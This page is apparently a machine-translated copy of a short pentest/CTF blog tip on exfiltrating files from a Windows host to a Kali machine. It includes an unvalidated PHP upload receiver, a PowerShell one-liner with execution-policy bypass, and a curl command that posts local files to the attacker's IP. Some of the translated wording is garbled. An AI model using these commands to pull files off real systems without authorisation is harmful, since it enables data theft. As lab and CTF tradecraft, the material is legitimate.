<html>
<head>
<title>[TIP] Uploading Files from Windows to Kali Using PHP</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[提示]使用PHP将文件从Windows上传到Kali</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tip-uploading-files-from-windows-to-kali-using-php-63aadde872a9?source=collection_archive---------0-----------------------#2020-01-24">https://infosecwriteups.com/tip-uploading-files-from-windows-to-kali-using-php-63aadde872a9?source=collection_archive---------0-----------------------#2020-01-24</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/8cf8f3c008625f409611e61a56bcdb31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IVeZwcToJMqvSaX1vHc8Ow.png"/></div></div></figure><h1 id="3270" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">问题</h1><p id="6010" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">当您执行pentest或CTF时，可能会遇到需要将文件从Windows box传输到Kali Linux的情况。例如，您在Windows box中本地运行Bloodhound，并需要将其输出传输到您的机器，或者您发现了非常有趣的Microsoft Office文件，如。多克和。xls，但当时你只有命令行权限。你可以考虑使用PHP脚本通过你的网络服务器上传文件。就我个人而言，我经常在玩CTF或HTB机器时使用这个。</p><h1 id="70f4" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">解决方法</h1><h2 id="688a" class="lx kc it bd kd ly lz dn kh ma mb dp kl lk mc md kp lo me mf kt ls mg mh kx mi bi translated">卡利盒</h2><p id="4fbb" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">首先，创建一个PHP脚本<code class="fe mj mk ml mm b">upload.php</code>来处理上传部分。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="ffc1" class="lx kc it mm b gy mv mw l mx my">&lt;?php<br/>$target_dir = "uploads/";<br/>$target_file = $target_dir . basename($_FILES["targetfile"]["name"]);<br/>move_uploaded_file($_FILES["targetfile"]["tmp_name"], $target_file)<br/>?&gt;</span></pre><p id="a316" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">对于web服务器，使用Kali默认自带的<code class="fe mj mk ml mm b">Apache2</code>。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="bd0e" class="lx kc it mm b gy mv mw l mx my"><strong class="mm iu"># Running Apache2 Server</strong><br/>service apache2 start</span></pre><p id="c44f" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">然后，将<code class="fe mj mk ml mm b">upload.php</code>脚本放在下面的web目录下。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="f18a" class="lx kc it mm b gy mv mw l mx my">/var/www/html/web/       <strong class="mm iu"># I added 'web' directory for demo purpose</strong></span></pre><p id="68c5" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">正如您从<code class="fe mj mk ml mm b">upload.php</code>脚本中注意到的，我们还需要创建一个名为<code class="fe mj mk ml mm b">uploads</code>的目录来收集上传的文件。在<code class="fe mj mk ml mm b">/var/www/html/web</code>目录下创建它，并配置适当的所有权和写权限。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="baa8" class="lx kc it mm b gy mv mw l mx my"><strong class="mm iu"># Creating 'uploads' Directory</strong><br/>mkdir /var/www/html/web/uploads</span><span id="753b" class="lx kc it mm b gy ne mw l mx my"><strong class="mm iu"># Configuring Directory Ownership with 'www-data' User</strong><br/>chown www-data:www-data /var/www/html/web/uploads</span><span id="1835" class="lx kc it mm b gy ne mw l mx my"><strong class="mm iu"># Configuring Directory with Write Permissions</strong><br/>chmod 766 /var/www/html/web/uploads</span></pre><p id="9f04" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">完成所有操作后，您应该已经建立了如下所示的web目录:</p><figure class="mn mo mp mq gt ju gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/a4af606fed399c06ab091b28c59d825c.png" data-original-src="https://miro.medium.com/v2/resize:fit:968/format:webp/1*deVtUdbhi73WPac8Tt_kvw.png"/></div></figure><h2 id="a337" class="lx kc it bd kd ly lz dn kh ma mb dp kl lk mc md kp lo me mf kt ls mg mh kx mi bi translated">Windows框</h2><p id="5b0a" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">从窗盒来说很简单。我们可以使用一个性感的PowerShell一行程序来完成这项工作。</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="79bc" class="lx kc it mm b gy mv mw l mx my"><strong class="mm iu"># PowerShell</strong><br/>powershell -nop -exec bypass Invoke-RestMethod -Uri <a class="ae ng" href="http://10.10.14.29/php/upload.php" rel="noopener ugc nofollow" target="_blank">http://&lt;<em class="nh">Your Kali IP</em>&gt;/web/upload.php</a> -Method Post -Infile 'c:\&lt;<em class="nh">Path to the Target File</em>&gt;'</span><span id="c812" class="lx kc it mm b gy ne mw l mx my"><strong class="mm iu"># Warning: If the 'Invoke' command is globally restricted, this would NOT work.</strong></span></pre><p id="cc87" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">或者</p><p id="f647" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">如果机器是Windows 10 build 17063或更高版本，我们可以使用<code class="fe mj mk ml mm b">curl.exe</code>来使用更性感的一行程序。(最后，微软开始在Windows :P中加入“黑客”工具)</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="075c" class="lx kc it mm b gy mv mw l mx my"><strong class="mm iu"># Curl</strong><br/>curl -H Content-Type:"multipart/form-data" --form targetfile=@"c:\&lt;<em class="nh">Path to the Target File</em>&gt;" -X POST -v <a class="ae ng" href="http://10.10.14.29/php/upload.php" rel="noopener ugc nofollow" target="_blank">http://&lt;<em class="nh">Your Kali IP</em>&gt;/web/upload.php</a></span></pre><p id="76aa" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">或者</p><p id="c6c4" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">如果是没有PowerShell和/或<code class="fe mj mk ml mm b">curl.exe</code>的旧Windows box，我们可以创建下面的<code class="fe mj mk ml mm b">html</code>文件，通过浏览器上传文件。(在我们的web根目录中找到这个<code class="fe mj mk ml mm b">html</code>文件)</p><pre class="mn mo mp mq gt mr mm ms mt aw mu bi"><span id="f7c6" class="lx kc it mm b gy mv mw l mx my"><strong class="mm iu"># Upload.html</strong></span><span id="4883" class="lx kc it mm b gy ne mw l mx my">&lt;html&gt;<br/>&lt;head&gt;&lt;/head&gt;<br/>&lt;body&gt;<br/>&lt;form action="<a class="ae ng" href="http://192.168.102.74/upload.php" rel="noopener ugc nofollow" target="_blank">http://&lt;Your Kali IP&gt;/web/upload.php</a>" method="POST" enctype="multipart/form-data"&gt;<br/>&lt;br&gt;&lt;br&gt;<br/>Choose A File:&lt;br&gt;<br/>&lt;input type="file" name="targetfile"&gt;&lt;br&gt;<br/>&lt;input type="submit" name="submit" value="upload"&gt;<br/>&lt;/form&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="1670" class="pw-post-body-paragraph kz la it lb b lc mz le lf lg na li lj lk nb lm ln lo nc lq lr ls nd lu lv lw im bi translated">尽情享受吧！</p><figure class="mn mo mp mq gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ni"><img src="../Images/194f8366961a52737ff7e0e428e6bad9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pQhupMNw55d_wj5WqSk7KQ.png"/></div></div></figure></div></div>    
</body>
</html>